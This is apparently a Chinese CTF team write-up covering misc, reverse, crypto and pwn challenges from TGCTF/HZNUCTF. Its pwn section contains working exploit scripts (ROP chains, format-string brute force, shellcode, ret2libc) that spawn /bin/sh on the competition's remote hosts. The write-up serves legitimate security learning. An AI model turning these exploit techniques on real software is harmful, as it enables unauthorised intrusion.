# Misc

## 这是啥o\_o | struck - Yolo

掉瓶颈了，首先把gif给分离出来，发现最后几张照片左上角有残缺二维码，把他们修复好后，得到一张汉信码，但是解密后并不是flag



![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918528.png)

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918529.png)

time is your fortune ,efficiency is your life

## Next is the end | FINISHED - Yolo

这类嵌套文件夹的问题，处理很简单，在终端使用dir -R就能发现我们要的文件路径

还有个超级简单的方法，就是用vscode打开就行，就像这样

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918530.png)

## where it is(osint) | Solved - Seandictionary,Yolo

yolo不想搞图寻，等Sean回来了帮忙弄一下

![](<https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918531.png>)

要求是找到右上角的站点名

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918532.png)



![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918533.png)

截图关键部分用谷歌识图搜索得到台北港墘地铁站



解决了，是TGCTF{港墘站}

## 小龙

用zsteg只能找到后半部分的flag

\_Clever\_guys}

## 你的运气是好是坏？| FINISHED - Spreng

```plain&#x20;text
好運來 祝你好運來 好運帶來了喜和愛 好運來 我們好運來 迎著好運興旺發達通四海 疊個千紙鶴 再系個紅飄帶 願善良的人們天天好運來 你勤勞生活美 你健康春常在 你一生的忙碌為了笑逐顏開 打個中國結 請春風剪個彩 願祖國的日月年年好運來 你鳳舞太平年 你龍騰新時代 你幸福的家園迎來百花盛開 好運來 祝你好運來 好運帶來了喜和愛 好運來 我們好運來 迎著好運興旺發達通四海 疊個千紙鶴 再系個紅飄帶 願善良的人們天天好運來 你勤勞生活美 你健康春常在 你一生的忙碌為了笑逐顏開 打個中國結 請春風剪個彩 願祖國的日月年年好運來 你鳳舞太平年 你龍騰新時代 你幸福的家園迎來百花盛開 好運來 祝你好運來 好運帶來了喜和愛 好運來 我們好運來 迎著好運興旺發達通四海 好運來 祝你好運來 好運帶來了喜和愛 好運來 我們好運來 迎著好運興旺發達通四海 好運來 祝你好運來 好運帶來了喜和愛 好運來 我們好運來 迎著好運興旺發達通四海 通四海 好運來 
```

flag为TGCTF{1\~99999999中的某一个数字}

六百六十六，都不带盐了。纯狗运啊，我本来猜测是作者或者歌曲日期的，发现都不对，随手填了一个114514。

TGCTF{114514}

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918534.png)

## TeamGipsy\&ctfer | FINISHED - Yolo

这种取证第一次见，挺有意思的

首先虚拟机我是可以仿真挂载，但是没有密码登录不进去，然后使用Diskgenius直接看文件目录，这里发现桌面有个mimi.txt，查看文件内容，发现很简单，拉个docker，里面弄了些和mysql有关的操作

```sql
    1  passwd hznuctfer
    2  reboot
    3  pass
    4  passwd hznuctfer
    5  reboot
    6  sudo apt update
    7  sudo apt install docker.io
    8  clear
    9  docker -v
   10  docker run -d --name TeamGipsyctf1 -e MYSQL_ROOT_PASSWORD=password_is_me mysql
   11  docker exec -it TeamGipsy1 bash
   12  docker exec -it TeamGipsyctf1 bash
   13  docker run -d --name TeamGipsyctf2 -e MYSQL_ROOT_PASSWORD=password_is_me mysql
   14  docker exec -it TeamGipsy2 bash
   15  docker exec -it TeamGipsyctf2 bash
   16  docker -l
   17  docker ps
   18  docker stop TeamGipsyctf1
   19  docker stop TeamGipsyctf2
   20  docker ps
   21  exit
   22  history
   23  history > mimi.txt

```

然后呢，我就把和docker相关的文件夹导出，看这个镜像里面有什么东西，这里遇到了点波折，dg没有破解的话，能恢复的文件有大小限制，我没去找网上的破解版本，直接用7z恢复了，然后查看了下文件目录

对了，需要恢复的docker文件在/var/lib/docker/

```typescript
yolo@Yolo:~/Desktop$ cd docker
yolo@Yolo:~/Desktop/docker$ ls
buildkit  containers  engine-id  image  network  overlay2
yolo@Yolo:~/Desktop/docker$ ls -l
total 24
drwxr-xr-x  4 yolo yolo 4096 Apr 12 16:31 buildkit
drwxr-xr-x  4 yolo yolo 4096 Apr 12 16:31 containers
-rw-r--r--  1 yolo yolo   36 Mar 15  2024 engine-id
drwxr-xr-x  3 yolo yolo 4096 Apr 12 16:31 image
drwxr-xr-x  3 yolo yolo 4096 Apr 12 16:31 network
drwxr-xr-x 16 yolo yolo 4096 Apr 12 16:32 overlay2
yolo@Yolo:~/Desktop/docker$ ls
buildkit  containers  engine-id  image  network  overlay2  plugins  runtimes  swarm  tmp  volumes
```

然后这里我拷打ai，完成了后续的操作，以下是命令汇总

```plain&#x20;text
sudo docker pull mysql:8.3.0
sudo docker pull mysql:5.7
sudo chown -R 999:999 ~/Desktop/docker/volumes/1c2724ccd3605664703d5c139c2b1c92198dc449fe2a9de7ffc015ceb11f9327/_data/
sudo chown -R 999:999 ~/Desktop/docker/volumes/1783d31445c82f27a817f947a32249bd2f15738dbb9906685aea05a339df20ba/_data/
sudo docker run -d --name TeamGipsyctf2 -v ~/Desktop/docker/volumes/1783d31445c82f27
a817f947a32249bd2f15738dbb9906685aea05a339df20ba/_data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=password_is_me mysq
l:8.3.0
sudo docker run -d --name TeamGipsyctf1 -v ~/Desktop/docker/volumes/1c2724ccd3605664703d5c139c2b1c92198dc449fe2a9de7ffc015ceb11f9327/_data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=password_is_me mysql:8.3.0
sudo docker exec -it TeamGipsyctf2 bash
mysql -u root -ppassword_is_me
SHOW DATABASES;     这里可以看到这个TeamGispy，其实这东西我在导出文件的时候就遇到了，下面有CTF.ibd和TG.ibd
USE TeamGispy;
SHOW TABLES;
SELECT * FROM CTF;  发现里面啥也没有
SELECT * FROM TG;   这里有我要的flag
```

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918535.png)

`HZNUCTF{0H!_YOu_are_really_the_TeamGipsy_ctfer}`

用zsteg得到了解压密码"key=i\_1ove\_y0u"







![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918536.png)

通过检查pngchunk，发现最后附加了串字符，进行解码，得到信息

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918537.png)

很不喜欢这种文邹邹的话啊，说的啥意思，难道是有盲水印？



# Reverse

## Base64 | FINISHED - Spreng

清晰的逻辑，魔改Base64

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918538.png)

魔改了位的分配和basetable，然后取basetable时还移位24了，所以解密时对basetable先移位24位

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918539.png)

```c++
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define _BYTE unsigned char

void base64decode(_BYTE *C, int len, _BYTE *P)
{
    int v3;
    __int64 v5;
    char v6;
    int i, j;
    unsigned char block[4];
    // unsigned char basetable[65] = "GLp/+Wn7uqX8FQ2JDR1c0M6U53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebI";
    unsigned char basetable[65] = "53sjBwyxglmrCVdSThAfEOvPHaYZNzo4ktK9iebIGLp/+Wn7uqX8FQ2JDR1c0M6U";

    for (i = 0; 4 * i < len; ++i)
    {
        block[3] = 0;
        block[2] = 0;
        block[1] = 0;
        block[0] = 0;
        for (j = 0; j < 4; ++j)
        {
            if (C[j + 4 * i] == '=')
                break;
            else
                block[j] = strchr(basetable, C[j + 4 * i]) - (int)basetable;
        }
        P[3 * i] = ((block[0] << 2) | (block[1] >> 4)) & 0xFF;
        P[3 * i + 1] = ((block[1] << 4) | (block[2] >> 2)) & 0xFF;
        P[3 * i + 2] = ((block[2] << 6) | block[3]) & 0xFF;
    }
}

int main()
{
    _BYTE C[] = "AwLdOEVEhIWtajB2CbCWCbTRVsFFC8hirfiXC9gWH9HQayCJVbB8CIF=";
    _BYTE P[100];
    base64decode(C, strlen(C), P);
    printf("%s\n", P);
    // HZNUCTF{ad162c-2d94-434d-9222-b65dc76a32}
    return 0;
}
```

## 水果忍者 | FINISHED - Spreng

dnspy反编译

```python
GameManager.encryptionKey = "HZNUHZNUHZNUHZNU";
GameManager.iv = "0202005503081501";
GameManager.encryptedHexData = "cecadff28e93aa5d6f65128ae33e734d3f47b4b8a050d326c534a732d51b96e2a6a80dca0d5a704a216c2e0c3cc6aaaf";
```

AES解密：HZNUCTF{de20-70dd-4e62-b8d0-06e}

下次试试直接修改代码。

## 蛇年的本命语言 | FINISHED - Spreng

简单python反编译，第一部分的字符字符串：flag中的字符替换为频率，第二部分将flag的字符变成字符+频率的形式，将这个新的字符串的每个字符的ascll码构建方程组

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918540.png)

sympy解方程组，由于变量名的排序会出现错排如0，1，10，11...，需要手工调一下。

然后用第一部分的字符串，频率换回原来的字符即可

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918541.png)

## XTEA | FINISHED - Spreng

4字节逆序，xtea加密，key用随机数取的，但种子已经给了。

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918542.png)

可恶，我看这个cipher是输入的，以为是爆破题，爆破完发现就是常规值，气死啦。

```c++
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>

#define _BYTE unsigned char
#define _DWORD unsigned int

unsigned int *__fastcall xtea_decrypt(int a1, unsigned int *a2, unsigned int *a3, __int64 a4)
{
    unsigned int *result; // rax
    unsigned int v5;      // [rsp+24h] [rbp+4h]
    unsigned int v6;      // [rsp+44h] [rbp+24h]
    unsigned int v7;      // [rsp+64h] [rbp+44h]
    int i;                // [rsp+84h] [rbp+64h]

    v5 = *a2;
    v6 = *a3;
    v7 = -a1 * 32;
    for (i = 0; i < 32; ++i)
    {
        // printf("%d %d %d\n", v5, v6, v7);
        v6 -= (*(_DWORD *)(a4 + 4LL * ((v7 >> 11) & 3)) + v7) ^ (v5 + ((v5 >> 5) ^ (16 * v5)));
        v7 += a1;
        v5 -= (*(_DWORD *)(a4 + 4LL * (v7 & 3)) + v7) ^ (v6 + ((v6 >> 5) ^ (16 * v6)));
    }

    *a2 = v5;
    result = a3;
    *a3 = v6;
    return result;
}

int main()
{
    int i;
    _DWORD key[4];
    unsigned int delta;
    _BYTE enc_flag[] = {
        0x24, 0x23, 0xCB, 0x8C, 0x1A, 0x74, 0xA7, 0x09,
        0x8D, 0x67, 0x3C, 0xFB, 0x79, 0x3A, 0x08, 0xF6,
        0x1B, 0x24, 0xCC, 0xF1, 0xF2, 0x59, 0xFA, 0x39,
        0xCC, 0xE1, 0xAB, 0xF2, 0x72, 0x9F, 0x18, 0x17};
    _BYTE flag[33];
    _DWORD v10[15];
    srand(0x7E8u);
    for (i = 0; i < 4; ++i)
        key[i] = rand();

    // test();

    for (delta = 0x9e3779b9; delta < 0xFFFFFFFF; delta++)
    {

        strcpy(flag, enc_flag);
        flag[32] = 0;

        for (i = 6; i >= 0; --i)
        {
            xtea_decrypt(delta, &flag[4 * i], &flag[4 * i + 4], key);
            if (i == 6 && flag[28] != '}')
                break;
        }

        if (!strncmp(flag, "UNZH", 3))
        {
            printf("%s %x\n", flag, delta);
            break;
        }

        if (delta % 0x1000000 == 0)
            printf("%x\n", delta);
    }

    // UNZH{FTC-6ea75f97b4-4b-49-32}be8

    for (int j = 0; j < 32; j += 4)
    {

        v10[j / 4] = *((char *)flag + j + 3) | (*((char *)flag + j + 2) << 8) | (*((char *)flag + j + 1) << 16) | (*((char *)flag + j) << 24);
    }
    for (i = 0; i < 7; ++i)
    {
        *(_DWORD *)(flag + 4 * i) = v10[i];
    }
    *(_DWORD *)(flag + 28) = v10[7];

    printf("%s\n", flag);
    // HZNUCTF{ae6-9f57-4b74-b423-98eb}

    return 0;
}
```

HZNUCTF{ae6-9f57-4b74-b423-98eb}



# Crypto

## 费克特尔 | FINISHED - Spreng

分解质因数

```plain&#x20;text
from Crypto.Util.number import *
import math

c = 670610235999012099846283721569059674725712804950807955010725968103642359765806
n = 810544624661213367964996895060815354972889892659483948276203088055391907479553
e = 65537

# Sat Apr 12 10:35:44 2025  p3 factor: 113
# Sat Apr 12 10:35:44 2025  p5 factor: 18251
# Sat Apr 12 10:35:44 2025  p7 factor: 2001511
# Sat Apr 12 10:35:44 2025  p27 factor: 214168842768662180574654641
# Sat Apr 12 10:35:44 2025  p39 factor: 916848439436544911290378588839845528581
p = [
    113,
    18251,
    2001511,
    214168842768662180574654641,
    916848439436544911290378588839845528581,
]
phi = math.prod([i - 1 for i in p])

d = inverse(e, phi)
m = pow(c, d, n)
print(long_to_bytes(m))
# b'TGCTF{f4888_6abdc_9c2bd_9036bb}'

```

## 宝宝rsa | FINISHED - SeanDictionary

```python
from Crypto.Util.number import *
import gmpy2

p1 = 8362851990079664018649774360159786938757293294328116561219351503022492961843907118845919317399785168488103775809531198339213009936918460080250107807031483
q1 = 8312546034426788223492083178829355192676175323324230533451989649056072814335528263136523605276378801682321623998646291206494179416941978672637426346496531
c1 = 39711973075443303473292859404026809299317446021917391206568511014894789946819103680496756934914058521250438186214943037578346772475409633145435232816799913236259074769958139045997486622505579239448395807857034154142067866860431132262060279168752474990452298895511880964765819538256786616223902867436130100322

n2 = 103873139604388138367962901582343595570773101048733694603978570485894317088745160532049473181477976966240986994452119002966492405873949673076731730953232584747066494028393377311943117296014622567610739232596396108513639030323602579269952539931712136467116373246367352649143304819856986264023237676167338361059
c2 = 51380982170049779703682835988073709896409264083198805522051459033730166821511419536113492522308604225188048202917930917221
e2 = 3

n1 = p1*q1
phi = (p1-1)*(q1-1)

for e1 in range(2**17, 2**18):
    if gcd(e1, phi) != 1:
        continue
    try:
        d1 = inverse(e1, phi)
        m1 = pow(c1, d1, n1)
        flag1 = long_to_bytes(int(m1)).decode()
    except:
        continue

while True:
    a,b = gmpy2.iroot(c2,e2)
    if b:
        flag2 = long_to_bytes(int(a)).decode()
        break
    c2 += n2

print(flag1+flag2)

# TGCTF{!!3xP_Is_Sm@ll_But_D@ng3r0}
```

##

## AAAAAAAA·真·签到 | FINISHED - Spreng

注意到UGBRC{RI0G!O04\_5C3\_OVUI\_DV\_MNTB}的UGBRC和TGCTF的差值分别是-1，0，1，2，3

故认为移位shift为i-1

```python

text = "UGBRC{RI0G!O04_5C3_OVUI_DV_MNTB}"
result = ""
for i in range(len(text)):
    char = text[i]
    shift = i - 1
    # 处理大写字母
    if char.isupper():
        shifted = (ord(char) - ord("A") + shift) % 26
        result += chr(shifted + ord("A"))
    # 处理小写字母
    elif char.islower():
        shifted = (ord(char) - ord("a") + shift) % 26
        result += chr(shifted + ord("a"))
    # 非字母字符保持不变
    else:
        result += char
print(result)

```

## mm不躲猫猫 | FINISHED - Spreng

先从众多n中两两取GCD，利用找出的素数进行分解n。

```go
p = set()

for i in range(len(n)):
    for j in range(i + 1, len(n)):
        if GCD(n[i], n[j]) != 1:
            # print(f"n[{i}] = {n[i]}, n[{j}] = {n[j]}")
            # print(f"c[{i}] = {c[i]}, c[{j}] = {c[j]}")
            # print(f"GCD(n[{i}], n[{j}]) = {GCD(n[i], n[j])}")
            p.add(GCD(n[i], n[j]))
print(p)
```

这里的n\[0]的素因数被找到了。

```python
p = 8966982846196321583218732818156212338929358106653027903288099594075033180211918114777730737751247653195936571427074856051307498770294940971178276714212171

q = n[0] // p
print(isPrime(p))
print(isPrime(q))

phi = (p - 1) * (q - 1)
d = inverse(e, phi)
m = pow(c[0], d, n[0])
print(long_to_bytes(m))
# b'TGCTF{ExcePt10n4lY0u_Fl4gF0rY0u_555b0nus}'
```

分享一点正则表达式的技巧，像他给的文件不能直接放进python中用，一个一个改又很麻烦，就可以用ctrl+H启用正则表达式替换，然后再微调一下。

```python
# "\[n_(\d+)\]" -> ""
# "\n\n\nn = " -> ")\n\nn.append("
# "\nc = " -> ")\nc.append("
```

## tRwSiAns\_ | FINISHED - Spreng

用一下立方差公式，凑差值

```python
c1 = pow(m + hash(307), 3, n)
c2 = pow(m + hash(7), 3, n)

c1 = m1^3
c2 = m2^3
c1 - c2 = (m1-m2)*(())
```

```python
# from flag import FLAG
from Crypto.Util.number import *
import hashlib
import gmpy2

def hash(x):
    return int(hashlib.md5(str(x).encode()).hexdigest(), 16)

n = 100885785256342169056765112203447042910886647238787490462506364977429519290706204521984596783537199842140535823208433284571495132415960381175163434675775328905396713032321690195499705998621049971024487732085874710868565606249892231863632731481840542506411757024315315311788336796336407286355303887021285839839
e = 3
c1 = 41973910895747673899187679417443865074160589754180118442365040608786257167532976519645413349472355652086604920132172274308809002827286937134629295632868623764934042989648498006706284984313078230848738989331579140105876643369041029438708179499450424414752031366276378743595588425043730563346092854896545408366
c2 = 41973912583926901518444642835111314526720967879172223986535984124576403651553273447618087600591347032422378272332279802860926604693828116337548053006928860031338938935746179912330961194768693506712533420818446672613053888256943921222915644107389736912059397747390472331492265060448066180414639931364582445814

d = hash(307) - hash(7) % n
x = (
    (pow(c1 - c2, 1, n) * pow(d, -1, n) - pow(d, 2, n)) * inverse(3, n) + pow(d, 2, n)
) % n

print(gmpy2.iroot(x, 2))
m = gmpy2.iroot(x, 2)[0] - (hash(307) + hash(7)) // 2
print(long_to_bytes(m))
# b'TGCTF{RS4_Tw1nZ_d0You_th1nk_ItS_fun_2win?!!!1111111111}'

```



## LLLCG

感觉是DSA恢复然后恢复LCG

## EZRSA | FINISHED - Spreng

解释一下emoji素数的生成，第一个参数是素数总位数，第二个参数是用getPrime生成的位数，例如这个p就是高224位用getPrime，剩下的用emoji，q就是全用emoji。

一个emoji有32位，所以p就是getPrime(224)<<224+9个emoji，q则是16个emoji。

题目给出了p低位（8个emoji），那就可以考虑coppersmith攻击。（其实我感觉q全都是emoji也有弱点，可能有非预期解）

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918543.png)

用这个脚本测试一下发现8个emoji算不出来，9个emoji就可以。

```python
from Crypto.Util.number import getPrime
p = getPrime(int(512))
q = getPrime(int(512))
n = p * q
test_bits = 224
p_h = p >> test_bits
R.<x> = PolynomialRing(Zmod(n))
f = (p_h << test_bits) + x
f.small_roots(2**test_bits,0.4)
```

因为emoji范围是u1F601 - u1F64F，不难爆破。

```python
from Crypto.Util.number import *

n = 156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579
c = 47047259652272336203165844654641527951135794808396961300275905227499051240355966018762052339199047708940870407974724853429554168419302817757183570945811400049095628907115694231183403596602759249583523605700220530849961163557032168735648835975899744556626132330921576826526953069435718888223260480397802737401

bit = 288

for code_point in range(0x1F600, 0x1F64F + 1):
    emoji = chr(code_point)
    p0 = emoji + "😘😾😂😋😶😾😳😷"
    low_p = bytes_to_long(p0.encode())

    R.<x> = PolynomialRing(Zmod(n), implementation='NTL')
    f = x * 2^bit + low_p
    roots = f.monic().small_roots(X=2^224, beta=0.4)

    if roots:
        print("Found: ")
        p = int(roots[0] * 2^bit + low_p)
        q = n // p
        assert p * q == n
        print(f"p = {p}")
        print(f"q = {q}")
        break
else:
    print("Fail")
    
'''
Found: 
p = 12424840247075830662687097292458444573014198016321428995092662043898159667123240573630892907827505266982898641483333170032514244713840745287869771915696311
q = 12602471198163266643743702664647336358595911975665358584258749238146841559843060594842063473155049870396568542257767865369797827796765830093256146584311989
'''
```

然后发现e与phi不互素，但公因数不大，分别是3和5，先分开各自求解m，再用CRT方法合并。

```python
from Crypto.Util.number import *
import gmpy2

def part_roots(n, c, e, p):
    # 将e约简到可逆，g为余下的因数
    def div_e(e, p):
        g = GCD(e, (p - 1))
        while GCD(e, (p - 1)) != 1:
            e //= GCD(e, (p - 1))
            g *= GCD(e, (p - 1))
        return e, g
    
    # 约简e，便于开根
    e, g = div_e(e, p)
    d = inverse(e, p - 1)
    M = pow(c, d, p)
    
    # 在有限域内开根
    R.<x> = Zmod(p)[]
    f = x ^ g - M
    return [int(i[0]) for i in f.monic().roots()]

n = 156583691355552921614631145152732482393176197132995684056861057354110068341462353935267384379058316405283253737394317838367413343764593681931500132616527754658531492837010737718142600521325345568856010357221012237243808583944390972551218281979735678709596942275013178851539514928075449007568871314257800372579
c = 47047259652272336203165844654641527951135794808396961300275905227499051240355966018762052339199047708940870407974724853429554168419302817757183570945811400049095628907115694231183403596602759249583523605700220530849961163557032168735648835975899744556626132330921576826526953069435718888223260480397802737401

p = 12424840247075830662687097292458444573014198016321428995092662043898159667123240573630892907827505266982898641483333170032514244713840745287869771915696311
q = 12602471198163266643743702664647336358595911975665358584258749238146841559843060594842063473155049870396568542257767865369797827796765830093256146584311989

e = "💯"
e = bytes_to_long(e.encode())

res1 = part_roots(n, c, e, p)
res2 = part_roots(n, c, e, q)

for i in res1:
    for j in res2:
        m = crt([i, j], [p, q])
#         print(long_to_bytes(m))
        try:
            print(long_to_bytes(m).decode())
        except:
            pass

```

如果不解码的话，会变成这个样子，刚开始还以为错了，检查半天，从一堆乱码中瞅见了TGCTF{

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918544.png)

解码是这样：TGCTF{🙇🏮🤟\_🫡🫡🫡\_🚩🚩🚩}😃😖😘😨😢

# PWN

## only\_gets | FINISHED - 01

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918545.png)

只有一个gets函数,其他什么都没有,got表也不可写

首先我想到要泄露libc,可是没有输出函数...

但是本地没有开启PIE保护,这就让我有了能使用magci\_gadget的机会

这个gadget 是通过错位得到的,直接在IDA中无法找到

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918546.png)

magci=0x400549-1

magic:

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918547.png)

可以修改rbp-0x3d的值,只要rbp与ebx是可控的,这时我们想到cus中刚刚好有控制二者的片段

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918548.png)

我们在rop中,可以将rbx设置为stdin+0x3d,那么此时我们就可以改变stdin内指向的内容,我们虽然不知道具体将其改成什么,但是我们知道\_IO\_2\_1\_stdin\_与write函数的偏移,那么利用这个偏移就可以将stdin修改为一个包含write函数的"表",结构和got表一模一样!而且它是可写的

想要直接利用got表的话,又要利用cus中的第二段gadget,这段gadget给予了我们直接调用got表中函数的能力,此时我们便可以轻松泄露libc

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918549.png)

不要忘记泄露完libc后要用上述流程将stdin重定向回\_IO\_2\_1\_stdin\_,我们后续还有直接攻击的rop链要注入,必须保证标准输入的合法

这后面就是普普通通的rop了,随便syscall或者system("/bin/sh")都可以,反正libc中什么都有:)

```python
from pwn import *
#io=process('./pwn')
io=remote("node2.tgctf.woooo.tech",32740)
libc=ELF('./libc.so.6')
def bug():
    gdb.attach(io)
rdi=0x400663
gets=0x400470
cus1=0x40065A
cus2=0x400640
magic=0x400548
stdin=0x601020
offset=0xFFFFFFFFFFEF9DD0//offset _IO_2_1_stdin_ to write==-1*0x106230
bss=0x601800
leave=0x4005FB
payload=b'\x00'*0x10+p64(bss+8)+p64(cus1)+p64(offset)+p64(stdin+0x3d)+p64(0)*4+p64(magic)+p64(cus1)
payload+=p64(0)+p64(1)+p64(stdin)+p64(1)+p64(0x600FE8)+p64(0x10)+p64(cus2)+p64(0)*7
payload+=p64(cus1)+p64(0x106230)+p64(stdin+0x3d)+p64(0)+p64(bss)+p64(0)*2+p64(magic)
payload+=p64(0x4005E5)

io.sendline(payload)
base=u64(io.recv(8))-libc.sym['gets']
success("base=>"+str(hex(base)))
system=base+libc.sym['system']
bin_sh=base+next(libc.search(b"/bin/sh\x00"))
print(hex(system))
rsi=base+0x000000000002be51
rdx=base+0x000000000011f2e7
rax=base+0x0000000000045eb0
syscall=base+0x0000000000029db4
payload=b'\x00'*0x18+p64(rdi)+p64(bin_sh)+p64(rsi)+p64(0)+p64(rdx)+p64(0)*2+p64(rax)+p64(0x3b)+p64(syscall)
io.sendline(payload)
io.interactive()
```

其实甚至可以不需要leak\_libc,我们可以flat\[向bss写入/bin/sh,重定向stdin为system,cus=>system("/bin/sh")]

只需要注入一次rop就够了

## fmt | FINISHED - 01

表面上只有一次格式化的机会

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918550.png)

我就直接爆破将返回地址的低24字节写为one\_gadget了,反正1/4096的概率也能接受吧(并不)

```python
from pwn import *
io=process('./pwn')
context.arch='amd64'
def pwn():
    io.recvuntil(b'your gift ')
    stack=int(io.recv(14),16)
    success("stack=>"+str(hex(stack)))
    io.recvuntil(b"please tell me your name")
    ret_addr=stack+0x68
    fini=0x403DB8
    magic=0x404010
    bss=0x404800
    one=[0xe3b01,0xe3afe,0xe3b04][0]
    payload=b'%c%9$hhn%11834c%10$hn'.ljust(24,b'\x00')+p64(ret_addr)+p64(ret_addr+1)
    print(hex(len(payload)))
    io.send(payload)
    io.interactive()
    io.sendline(b"cat f*")
while True:
    io=remote("node1.tgctf.woooo.tech",30924)
    try:
        pwn()
    except:
        io.close()
```

## shellcode | FINISHED - 01

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918551.png)

可以写入18字节,且只有这18字节可执行,关闭了这部分的写,执行权限,因此不能直接写nop滑梯了

我将18字节分为两部分:

1.恢复当前地址的rwx权限

2.调用read写入nop滑梯和execv\_shellcode

```python
"mov al,0xa;mov dl,7;mov sil,0xff;syscall;mov edx,esi;mov rsi,rdi;xor edi, edi;syscall;"
```

优化优化再优化,最后居然满足了18字节的限制

那剩下的工作就非常简单了

```python
pay=b'\x90'*0x20+asm("mov rdi,rcx;mov al,0xa;mov dl,7;mov rsi,0x1000;syscall;mov rsi,rcx;xor rdi,rdi;mov rdx,0x1000;xor rax,rax;syscall")
io.send(pay)
pause()
pay=b'\x90'*0x20+asm("lea rdi,[rcx+0x21];mov rax,0x3b;xor rsi,rsi;xor rdx,rdx;syscall")+b'/bin/sh\x00'
```

其实0xff已经完全够了,当时下意识怕写滑梯不够用,第三次调用read注入nop滑梯,其实完全没有必要

## 签到 | FINISHED - 01

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918552.png)

裸gets函数总不能有人不会吧

```python
from pwn import *
libc=ELF('./libc.so.6')
io=remote("node2.tgctf.woooo.tech",31218)
elf=ELF('./pwn')
payload=b'a'*0x78+p64(0x0000000000401176)+p64(elf.got['gets'])+p64(elf.plt['puts'])+p64(0x401178)
io.recvuntil(b'please leave your name.\n')
io.sendline(payload)
base=u64(io.recv(6)+b'\x00\x00')-libc.sym['gets']
system=base+libc.sym['system']
bin_sh=base+next(libc.search(b"/bin/sh"))
payload=b'a'*0x78+p64(0x0000000000401176+1)+p64(0x0000000000401176)+p64(bin_sh)+p64(system)
io.sendline(payload)
io.interactive()
```

最经典的ret2libc模板

## overflow | FINISHED - 01

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918553.png)

静态编译的,用ROPchain生成rop链就好了,但是注意

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918554.png)

所以我们将栈迁移到name中,在gets溢出中把rbp覆盖为name

这道题不是经典的leave\_ret结尾

```python
from pwn import *
from struct import pack
#io=process('./pwn')
# Padding goes here
io=remote("node1.tgctf.woooo.tech",32397)
p  = pack('<I', 0x08060bd1) # pop edx ; ret
p += pack('<I', 0x080ee060) # @ .data
p += pack('<I', 0x080b470a) # pop eax ; ret
p += b'/bin'
p += pack('<I', 0x080597c2) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08060bd1) # pop edx ; ret
p += pack('<I', 0x080ee064) # @ .data + 4
p += pack('<I', 0x080b470a) # pop eax ; ret
p += b'//sh'
p += pack('<I', 0x080597c2) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08060bd1) # pop edx ; ret
p += pack('<I', 0x080ee068) # @ .data + 8
p += pack('<I', 0x080507e0) # xor eax, eax ; ret
p += pack('<I', 0x080597c2) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08049022) # pop ebx ; ret
p += pack('<I', 0x080ee060) # @ .data
p += pack('<I', 0x08049802) # pop ecx ; ret
p += pack('<I', 0x080ee068) # @ .data + 8
p += pack('<I', 0x08060bd1) # pop edx ; ret
p += pack('<I', 0x080ee068) # @ .data + 8
p += pack('<I', 0x080507e0) # xor eax, eax ; ret
p += pack('<I', 0x08082bbe) # inc eax ; ret
p += pack('<I', 0x08082bbe) # inc eax ; ret
p += pack('<I', 0x08082bbe) # inc eax ; ret
p += pack('<I', 0x08082bbe) # inc eax ; ret
p += pack('<I', 0x08082bbe) # inc eax ; ret
p += pack('<I', 0x08082bbe) # inc eax ; ret
p += pack('<I', 0x08082bbe) # inc eax ; ret
p += pack('<I', 0x08082bbe) # inc eax ; ret
p += pack('<I', 0x08082bbe) # inc eax ; ret
p += pack('<I', 0x08082bbe) # inc eax ; ret
p += pack('<I', 0x08082bbe) # inc eax ; ret
p += pack('<I', 0x08049c6a) # int 0x80
io.send(p)
pause()
payload=p32(0x080EF324)*0x35
#gdb.attach(io)
io.sendline(payload)
io.interactive()
```

## Stack | FINISHED - 01

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918555.png)

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918556.png)

存在溢出,但本题存在一个模拟影子堆栈的机制会对返回地址进行检查

![](https://bucket-of-spreng.oss-cn-beijing.aliyuncs.com/img/20250505205918557.png)

如果返回地址被修改则进入异常处理函数

